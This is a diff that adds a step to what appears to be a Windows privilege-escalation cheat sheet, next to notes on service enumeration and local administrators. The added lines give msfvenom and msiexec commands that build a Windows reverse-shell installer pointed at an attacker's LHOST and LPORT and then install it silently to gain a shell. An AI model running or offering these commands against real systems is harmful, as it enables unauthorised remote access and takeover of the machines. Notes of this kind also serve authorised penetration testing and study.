@@ -200,6 +200,15 @@ wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr
 
   * net localgroup administrators
   * user should exists
+  
+  
+  * Other way: On Kali, generate a reverse shell Windows Installer (reverse.msi) using msfvenom. Update the LHOST IP address accordingly:
+     * msfvenom -p windows/x64/shell_reverse_tcp LHOST=\<ip> LPORT=\<port> -f msi -o reverse.msi
+     
+  * open listener
+  
+  *  execute the msi:
+     * msiexec /quiet /qn /i C:\path\reverse.msi
 
 
 # Insecure Service Permissions
